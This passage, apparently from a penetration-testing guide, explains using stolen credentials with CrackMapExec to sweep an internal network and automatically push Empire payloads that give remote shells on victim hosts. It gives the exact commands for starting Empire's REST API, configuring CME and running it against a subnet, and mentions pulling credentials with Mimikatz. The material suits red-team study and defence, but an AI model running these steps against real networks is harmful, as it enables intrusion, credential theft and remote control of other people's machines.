  md: "these user accounts and start password spraying again!\n\n# Scanning the Network\
    \ with CrackMapExec (CME)\n\nIf we don't have a compromised system yet, but we\
    \ did gain credentials through Responder, misconfigured web app, bruteforcing,\
    \ or a printer, then we can try to sweep the network to see where this account\
    \ can log in. A simple sweep using a tool like CrackMapExec (cme) can assist in\
    \ finding that point of entry on the internal network.\n\nHistorically, we have\
    \ used CME to scan the network, identify/authenticate via SMB on the network,\
    \ execute commands remotely to many hosts, and pull full text credo via Mimikatz.\
    \ With newer features in both Empire and CME, we can take advantage of Empire's\
    \ REST feature. In the following scenario, we are going to spin up Empire with\
    \ its REST API, configure the password in CME, have CME connect to Empire, scan\
    \ the network with the single credential have, and finally, if we authenticate,\
    \ automatically push an Empire payload to the remote victim's system. If you have\
    \ a helpdesk get ready for load of Empire shells!\n\n+   * Start Empire's REST\
    \ API server\n    * cd /opt/Empire\n    * ./empire --rest --password 'hackuniverse'\n\
    * Change the CrackMapExec Password\n    * gedit /root/cme/cme.conf\n    * password=hackuniverse\n\
    * Run CME to spawn Empire shells\n    * cme smb 10.100.100.0/24 -d 'cyberberskittens.local'\
    \ -u '<username>' -p '<password>' -M _exec -u LISTENER=http\n\n```\ncrackmapexec.py\
